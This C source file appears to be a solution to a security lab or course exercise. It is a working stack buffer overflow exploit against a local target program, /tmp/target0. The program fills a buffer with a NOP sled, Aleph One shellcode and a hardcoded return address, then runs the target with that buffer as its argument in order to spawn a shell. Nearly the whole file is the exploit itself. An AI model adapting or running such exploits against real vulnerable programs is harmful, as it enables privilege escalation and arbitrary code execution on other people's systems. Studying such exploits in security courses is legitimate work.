#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"
//#define TARGET "./meet"

unsigned long get_sp(void)
{
	__asm__("movl %esp, %eax");
}

unsigned char *getByteArrayFromLong(unsigned long longInt) 
{
	unsigned char *byteArray = malloc(sizeof(char) * 4);

	// convert from an unsigned long int to a 4-byte array
	byteArray[0] = (int)((longInt >> 24) & 0xFF) ;
	byteArray[1] = (int)((longInt >> 16) & 0xFF) ;
	byteArray[2] = (int)((longInt >> 8) & 0XFF);
	byteArray[3] = (int)((longInt & 0XFF));

	return byteArray;
}

int main(void)
{
	char *args[3]; 
	char *env[1];
	unsigned char esp[4];
	int index = 0;
	int A1 = 203;
	int A2 = 38;

	int shellLen = strlen(shellcodeAlephOne);
	int bufferSize = 8 + A1 + 4*A2 + shellLen;

	char bufferPtr[bufferSize];

	//int *bufPtr = (int *) bufferPtr;
	//int esp = get_sp()-0x300;

	//for(int j = 0; j < 400; j+=4)
	//{
	//	*bufPtr++ = esp;
	//}

//	esp = getByteArrayFromLong(get_sp() - 0x300);
	esp[0] = 0x94;esp[1]=0xfb;esp[2]=0xff;esp[3]=0xbf;
	for(int j = 0; j < bufferSize; j+=4) 
	{
		bufferPtr[j + 0] = esp[0];
		bufferPtr[j + 1] = esp[1];
		bufferPtr[j + 2] = esp[2];
		bufferPtr[j + 3] = esp[3];
		//printf("%i\n", j);
	}

	for(int i = 0; i < A1;i++) 
	{
		bufferPtr[i] = 0x90;
	}

	for(int k = 0; k < shellLen; k++) 
	{
		bufferPtr[A1 + k] = shellcodeAlephOne[k];
	}	

	for (int i = 0; i < bufferSize; i++)
	{
//    		if (i > 0) printf(":");
//    		printf("%hhX", bufferPtr[i]);
	}

//	printf("\n%s\n", bufferPtr);
//	printf("\n");	
	args[0] = TARGET;
	args[1] = bufferPtr; 
	args[2] = NULL;

	env[0] = NULL;
	execve(TARGET, args, env);

	return 0;
}
